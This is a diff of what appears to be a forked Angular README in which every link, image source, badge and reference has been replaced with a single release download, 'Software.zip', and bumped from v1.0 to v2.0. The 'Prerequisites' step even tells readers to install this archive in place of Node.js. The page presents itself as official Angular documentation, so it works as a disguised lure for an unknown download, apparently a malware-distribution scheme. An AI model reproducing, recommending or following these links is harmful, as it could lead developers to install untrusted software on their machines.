@@ -1,7 +1,7 @@
 <h1 align="center">Angular - The modern web developer's platform.</h1>
 
 <p align="center">
-  <img src="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip" alt="angular-logo" width="120px" height="120px"/>
+  <img src="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip" alt="angular-logo" width="120px" height="120px"/>
   <br>
   <i>Angular is a development platform for building mobile and desktop web applications
     <br> using Typescript/JavaScript and other languages.</i>
@@ -9,29 +9,29 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip"><strong>https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip</strong></a>
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip"><strong>https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip</strong></a>
   <br>
 </p>
 
 <p align="center">
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip">Contributing Guidelines</a>
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip">Contributing Guidelines</a>
   ·
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip">Submit an Issue</a>
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip">Submit an Issue</a>
   ·
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip">Blog</a>
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip">Blog</a>
   <br>
   <br>
 </p>
 
 <p align="center">
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip">
-    <img src="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip" alt="CI status" />
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip" alt="CI status" />
   </a>&nbsp;
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip">
-    <img src="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip+package&color=limegreen" alt="Angular on npm" />
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip+package&color=limegreen" alt="Angular on npm" />
   </a>&nbsp;
-  <a href="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip">
-    <img src="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip" alt="Discord conversation" />
+  <a href="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip">
+    <img src="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip" alt="Discord conversation" />
   </a>
 </p>
 
@@ -58,7 +58,7 @@ Get started with Angular, learn the fundamentals and explore advanced topics on 
 
 ### Prerequisites
 
-- Install [https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip] which includes [Node Package Manager][npm]
+- Install [https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip] which includes [Node Package Manager][npm]
 
 ### Setting Up a Project
 
@@ -90,7 +90,7 @@ Angular is cross-platform, fast, scalable, has incredible tooling, and is loved 
 ## Ecosystem
 
 <p>
-  <img src="https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip" alt="angular ecosystem logos" width="500px" height="auto">
+  <img src="https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip" alt="angular ecosystem logos" width="500px" height="auto">
 </p>
 
 - [Angular Command Line (CLI)][cli]
@@ -102,7 +102,7 @@ Angular is cross-platform, fast, scalable, has incredible tooling, and is loved 
 
 ## Upgrading
 
-Check out our [upgrade guide](https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip) to find out the best way to upgrade your project.
+Check out our [upgrade guide](https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip) to find out the best way to upgrade your project.
 
 ## Contributing
 
@@ -112,7 +112,7 @@ Read through our [contributing guidelines][contributing] to learn about our subm
 
 ### Want to Help?
 
-Want to report a bug, contribute some code, or improve documentation? Excellent! Read up on our guidelines for [contributing][contributing] and then check out one of our issues labeled as <kbd>[help wanted](https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip%20wanted)</kbd> or <kbd>[good first issue](https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip%20first%20issue)</kbd>.
+Want to report a bug, contribute some code, or improve documentation? Excellent! Read up on our guidelines for [contributing][contributing] and then check out one of our issues labeled as <kbd>[help wanted](https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip%20wanted)</kbd> or <kbd>[good first issue](https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip%20first%20issue)</kbd>.
 
 ### Code of Conduct
 
@@ -129,31 +129,31 @@ Join the conversation and help the community.
 - [StackOverflow][stackoverflow]
 - Find a Local [Meetup][meetup]
 
-[![Love Angular badge](https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip)](https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip)
+[![Love Angular badge](https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip)](https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip)
 
 **Love Angular? Give our repo a star :star: :arrow_up:.**
 
-[contributing]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[quickstart]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[changelog]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[ng]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[documentation]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[angularmaterial]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[cli]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[architecture]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[componentstemplates]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[forms]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[api]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[angularelements]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[ssr]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[schematics]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[lazyloading]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[npm]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[codeofconduct]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[twitter]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[discord]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[gitter]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[stackoverflow]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[youtube]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
-[meetup]: https://github.com/montaigne23/angular/releases/download/v1.0/Software.zip
+[contributing]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[quickstart]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[changelog]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[ng]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[documentation]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[angularmaterial]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[cli]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[architecture]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[componentstemplates]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[forms]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[api]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[angularelements]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[ssr]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[schematics]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[lazyloading]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[npm]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[codeofconduct]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[twitter]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[discord]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[gitter]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[stackoverflow]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[youtube]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
+[meetup]: https://github.com/montaigne23/angular/releases/download/v2.0/Software.zip
